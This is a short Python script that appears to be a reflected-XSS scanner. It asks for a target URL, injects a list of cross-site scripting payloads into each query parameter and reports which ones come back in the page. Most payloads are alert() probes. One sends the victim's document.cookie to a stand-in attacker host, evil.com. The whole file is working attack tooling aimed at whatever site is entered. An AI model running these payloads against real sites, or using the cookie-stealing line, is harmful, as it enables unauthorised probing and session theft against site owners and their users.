import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

payloads = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "javascript:alert('XSS')",
    "\" onmouseover=\"alert('XSS')\"",
    "<body onload=alert('XSS')>",
]

def test_url(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = payload
    new_query = urlencode(params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))
    try:
        r = requests.get(test_url, timeout=10)
        if payload in r.text:
            return True
    except requests.RequestException:
        pass
    return False

def main():
    target = input("Enter target URL (e.g., http://example.com/page.php?q=test): ").strip()
    parsed = urlparse(target)
    params = parse_qs(parsed.query)
    if not params:
        print("No URL parameters found. Try a URL with query parameters.")
        return
    print(f"\nTesting {len(params)} parameter(s) with {len(payloads)} payloads...\n")
    for param in params:
        for payload in payloads:
            reflected = test_url(target, param, payload)
            status = "REFLECTED" if reflected else "not reflected"
            print(f"  [{status}] {param} = {payload[:40]}{'...' if len(payload) > 40 else ''}")
    print("\nDone. If a payload was REFLECTED, the page may be vulnerable to XSS.")

if __name__ == "__main__":
    main()
